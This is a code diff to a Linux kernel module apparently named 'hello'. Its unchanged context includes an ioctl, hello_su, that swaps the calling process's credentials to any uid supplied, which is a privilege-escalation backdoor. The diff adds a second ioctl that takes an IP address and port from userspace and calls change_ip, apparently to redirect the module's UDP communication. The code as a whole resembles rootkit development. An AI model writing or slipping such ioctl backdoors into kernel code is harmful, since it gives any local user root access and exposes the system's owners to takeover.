@@ -10,7 +10,14 @@
 #include <linux/inet.h>
 #include <net/udp.h>
 
+struct test_ip_ioctl_request {
+	uint16_t port;
+	char ip[255];
+};
+
 #define TEST_SU_IOCTL _IO(150, 1)
+#define TEST_IP_IOCTL _IOR(150, 2, struct test_ip_ioctl_request)
+
 
 static struct socket *sock = NULL;
 
@@ -126,7 +133,7 @@ long hello_su(int uid) {
   struct cred* new_cred;
 	kuid_t v = {uid};
 
-	printk("changing to %d\n", uid);
+	printk("changing user to %d\n", uid);
 
   new_cred = prepare_creds();
   if(!new_cred) {
@@ -142,10 +149,21 @@ long hello_su(int uid) {
 }
 
 long hello_ioctl(struct file *fp, unsigned int cmd, unsigned long arg) {
+	struct test_ip_ioctl_request req;
   switch(cmd) {
     case TEST_SU_IOCTL:
       return hello_su(arg);
-      break;
+
+		case TEST_IP_IOCTL:
+			if(copy_from_user(&req, arg, sizeof(req))) {
+				return -EFAULT;
+			}
+
+			// dont trust userspace!
+			req.ip[sizeof(req.ip) - 1] = 0;
+
+			printk("changing to %s:%d\n", req.ip, req.port);
+			return change_ip(req.ip);
   }
 
   return -ENOTTY;
